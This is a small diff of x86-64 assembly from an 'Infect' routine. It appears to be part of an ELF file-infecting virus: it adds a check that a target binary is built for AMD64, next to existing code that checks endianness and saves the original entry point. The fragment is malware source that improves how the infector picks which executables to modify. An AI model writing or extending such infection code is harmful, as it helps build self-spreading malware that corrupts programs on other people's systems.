@@ -151,6 +151,11 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   cmp     rbx,  ELF_LENDIAN
   jne     .InfectCleanUp
 
+  ; check architecture
+  movzx   rbx,  byte [rax + elf64_hdr.e_machine]
+  cmp     rbx,  ELF_AMD64
+  jne     .InfectCleanUp
+
   ; save entry
   mov     rax,  [rax + elf64_hdr.e_entry]
   mov     [rsp + 0x10], rax
